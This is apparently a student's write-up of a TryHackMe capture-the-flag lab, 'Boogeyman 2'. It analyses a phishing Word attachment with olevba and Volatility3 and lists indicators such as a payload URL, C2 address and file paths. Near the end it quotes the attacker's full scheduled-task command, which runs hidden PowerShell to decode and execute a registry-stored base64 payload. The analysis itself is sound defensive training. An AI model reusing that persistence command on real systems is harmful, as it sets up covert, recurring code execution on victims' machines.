# Boogeyman 2 =={ START }==
--------------

**---SOLO---**

This is a TryHackMe Lab CTF exercise.  
*Note: All content is fictional and for educational purposes only.*

- **Phishing email sender:** `[REDACTED_EMAIL]`
- **Victim's email:** `[REDACTED_EMAIL]`

**Malicious file attachment:**  
- Original name: `Resume_WesleyTaylor.doc`  
- Renamed as: `Malware.doc`  
- File hash: `52c4384a0b9e248b95804352ebec6c5b`

The malware appears to operate in multiple stages; at least a stage 2 was identified.

**Analysis steps:**

- Used the `olevba` tool for further inspection:  
  ```shell
  olevba Malware.doc
  ```
- Discovered stage 2 payload download URL:  
  `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png`
- The Windows process executing the stage 2 payload: `wscript.exe`
- Stage 2 payload path: `C:\ProgramData\update.js`

**Forensics (Volatility3):**

Volatility3 commands used:
```shell
vol -f WKSTN-2961.raw <plugin>
vol -f WKSTN-2961.raw -h
```

Plugins of choice:
- `windows.pstree.PsTree`
- `windows.psscan.PsScan`
- `windows.pslist.PsList`
- `windows.strings.Strings`

Initial attempts:
```shell
vol -f WKSTN-2961.raw windows.pstree.PsTree
vol -f WKSTN-2961.raw windows.netscan.NetScan
```

- Stage 2 PID: **4260**
- Parent process of `wscript.exe`: `WINWORD.EXE` (PID: 1124)
- `windows.strings.Strings` plugin was not effective here

*Note: For questions 5 and 10, the answer was autocorrected from `.png` to `.exe`. Verified using the `filescan` plugin and extraction steps below.*

**---SOLO---**

---

**---RESEARCH_START---**

Used:
```shell
vol -f WKSTN-2961.raw windows.filescan | grep -i update
```
- Found: `update[1].exe`

Dumped the file:
```shell
vol -f WKSTN-2961.raw windows.dumpfiles --virtaddr 0xe58f8928f8b0
```
- Checked filetype and contents:
  ```
  file 'file.0xe58f8928f8b0.0xe58f838dd360.DataSectionObject.update[1].exe.dat'
  cat 'file.0xe58f8928f8b0.0xe58f838dd360.DataSectionObject.update[1].exe.dat'
  ```
- No major findings at this stage

Further research:
```shell
strings WKSTN-2961.raw | grep boogeymanisback.lol
```
- Located the update.exe webserver URL:  
  `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe`

Used `netscan` plugin for C2 clues:
- The threat actor favors port **8080**.
- PID of malicious process: **6216**
- Confirmed: `updater.exe` is the malicious process

Malicious file path:
- `C:\Windows\Tasks\Updater.exe`

C2 IP & port:
- `128.199.95.189:8080`

Malicious .doc attachment email path:
- `\Users\[REDACTED_USER]\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc`

**---RESEARCH_END---**

---

**---SOLO AGAIN---**

PID: **6216**  
Confirmed as correct.  
`updater.exe` is the malicious process.

Full file path: `C:\Windows\Tasks\Updater.exe`

C2 IP Address & port: `128.199.95.189:8080`

Malicious .doc attachment path:  
`\Users\[REDACTED_USER]\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc`

---

Last question required more research regarding scheduled processes.

**---RESEARCH START---**

- Searched for "schedule" in file paths:
  ```shell
  vol -f WKSTN-2961.raw windows.filescan | grep -i "schedule"
  ```
- Windows uses the **Task Scheduler**:
  - Path: `\Windows\System32\winevt\Logs\Microsoft-Windows-TaskScheduler`

Event log IDs 106 (task creation) and 140 (update) are potentially relevant.

No direct plugin for event IDs found.

Walkthrough research:
```shell
strings WKSTN-2961.raw | grep schtasks
```
- Found the persistence mechanism:

**Full Command:**
```shell
schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\""
```
Persistence established via Task Scheduler, storing a listener in:
  - `HKCU:\Software\Microsoft\Windows\CurrentVersion\debug`
  - Updater scheduled daily at 09:00.

**--END RESEARCH--**

==FINISH==

```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣔⠒⠀⠉⠉⠢⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⣀⠠⠄⠒⠘⢿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀
⢺⣦⢻⣿⣿⣿⣿⣄⠀⠀⠀⠀⠈⢿⡿⠿⠛⠛⠐⣶⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀
⠈⢿⣧⢻⣿⣿⣿⣿⣆⣀⣠⣴⣶⣿⡄⠀⠀⠀⠀⠘⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀
⠀⠀⢿⣧⢋⠉⠀⠀⠀⠹⣿⣿⣿⣿⣿⡆⣀⣤⣤⣶⣮⠀⠀⠀⠀⠣⠀⠀⠀⠀
⠀⠀⠈⢿⣧⢂⠀⠀⠀⠀⢘⠟⠛⠉⠁⠀⠹⣿⣿⣿⣿⣷⡀⠀⠀⠀⢣⠀⠀⠀
⠀⠀⠀⠈⢿⣧⢲⣶⣾⣿⣿⣧⡀⠀⠀⠀⢀⣹⠛⠋⠉⠉⠉⢿⣿⣿⣿⣧⠀⠀
⠀⠀⠀⠀⠀⢿⣧⢻⣿⣿⣿⡿⠷⢤⣶⣿⣿⣿⣧⡀⠀⠀⠀⠈⢻⣿⣿⣿⣧⠀
⠀⠀⠀⠀⠀⠈⢿⣧⢛⠉⠁⠀⠀⠀⢻⣿⣿⣿⡿⠗⠒⠒⠈⠉⠉⠉⠙⡉⠛⡃
⠀⠀⠀⠀⠀⠀⠈⢿⣯⢂⠀⠀⠀⡀⠤⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⢿⣯⠐⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
```